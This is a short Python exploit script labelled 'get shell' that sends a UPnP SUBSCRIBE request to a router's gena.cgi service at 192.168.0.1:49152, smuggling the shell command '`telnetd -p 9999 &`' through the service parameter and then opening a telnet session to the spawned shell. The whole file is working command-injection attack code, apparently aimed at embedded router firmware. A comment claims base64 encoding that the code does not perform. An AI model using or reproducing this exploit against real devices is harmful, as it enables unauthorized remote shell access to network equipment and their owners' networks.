#!/usr/bin/python3

# get shell
# 	sudo python3 exp.py 

import socket
import os
from time import sleep
def httpSUB(server, port, shell_file):
	print('\n[*] Connection {host}:{port}'.format(host=server, port=port))

	sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	request  = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
	request += "NT: upnp:event\n"
	request += "Callback: <http://127.0.0.1:9999/Squirre17>\n"
	request += "Host: " + str(server) + str(port) + "\n"
	request += "Timeout: Second-1000\n"
	print('[*] Sending Payload')
	sleep(1)

	sd.connect((socket.gethostbyname(server), port))
	sd.send(request.encode())# 报文通过base64发送
	results = sd.recv(4096)
	print('[*] Running Telnetd Service')
	sleep(2)

	print('[*] Opening Telnet Connection\n')
	os.system('telnet ' + str(server) + ' 9999')

serverInput = "192.168.0.1"
portInput = 49152
httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')